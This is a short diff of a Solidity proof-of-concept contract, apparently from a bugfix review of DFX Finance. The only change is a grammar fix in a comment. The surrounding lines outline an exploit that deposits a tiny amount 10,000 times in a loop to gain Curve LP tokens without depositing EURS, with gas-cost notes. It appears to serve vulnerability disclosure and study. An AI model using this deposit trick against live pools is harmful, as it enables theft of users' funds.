@@ -37,7 +37,7 @@ contract DFXFinanceBugfixReview is PoC {
         uint256 maxBaseAmount = 7992005633260983540235600000000;
         uint256 deadline = 1676706352308;
 
-        // Deposit small amount in a loop 10,000 times to gain curve LP tokens without depositing EURS
+        // Deposit a small amount in a loop 10,000 times to gain curve LP tokens without depositing EURS
         // If gas price is 231 wei = 0.000000231651787155 => Gas = 161 matic
         console.log("Deposit small amount to curve pool 10,000 times");
         for (uint256 i = 0; i < 10000; i++) {
